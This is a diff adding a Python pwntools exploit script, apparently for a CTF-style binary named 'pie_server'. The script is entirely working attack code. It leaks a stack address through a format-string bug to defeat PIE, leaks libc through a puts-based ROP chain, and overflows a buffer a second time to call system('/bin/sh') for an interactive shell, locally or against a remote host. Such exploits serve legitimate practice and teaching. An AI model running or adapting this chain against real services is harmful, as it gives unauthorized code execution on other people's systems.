@@ -1,0 +1,100 @@
+from pwn import *
+
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Specify your GDB script here for debugging
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+
+# Set up pwntools for the correct architecture
+exe = './pie_server'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Enable verbose logging so we can see exactly what is being sent (info/debug)
+context.log_level = 'debug'
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Offset to RIP, found manually with GDB
+offset = 264
+
+# Start program
+io = start()
+
+# Offset of pop_rdi gadget from ropper
+# We need to find the PIEBASE before we can use
+pop_rdi_offset = 0x12ab
+
+# Leak 15th address from stack (main+44)
+io.sendlineafter(b':', '%{}$p'.format(15), 16)
+io.recvuntil(b'Hello ')  # Address will follow
+leaked_addr = int(io.recvline(), 16)
+info("leaked_address: %#x", leaked_addr)
+
+# Now calculate the PIEBASE
+elf.address = leaked_addr - 0x1224
+info("piebase: %#x", elf.address)
+
+# Update pop_rdi gadget
+pop_rdi = elf.address + pop_rdi_offset
+
+# Payload to leak libc function
+payload = flat({
+    offset: [
+        pop_rdi,  # Pop got.puts into RDI
+        elf.got.puts,
+        elf.plt.puts,  # Call puts() to leak the got.puts address
+        elf.symbols.vuln  # Return to vuln (to overflow buffer with another payload)
+    ]
+})
+
+# Send the payload
+io.sendlineafter(b':P', payload)
+
+io.recvlines(2)  # Blank line
+
+# Retrieve got.puts address
+got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
+info("leaked got_puts: %#x", got_puts)
+
+# Subtract puts offset to get libc base
+# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
+libc_base = got_puts - 0x765f0
+info("libc_base: %#x", libc_base)
+
+# Add offsets to get system() and "/bin/sh" addresses
+# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
+system_addr = libc_base + 0x48e50
+info("system_addr: %#x", system_addr)
+# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
+bin_sh = libc_base + 0x18a152
+info("bin_sh: %#x", bin_sh)
+
+# Payload to get shell: system('/bin/sh')
+payload = flat({
+    offset: [
+        pop_rdi,
+        bin_sh,
+        system_addr
+    ]
+})
+
+# Send the payload
+io.sendline(payload)
+
+# Got Shell?
+io.interactive()
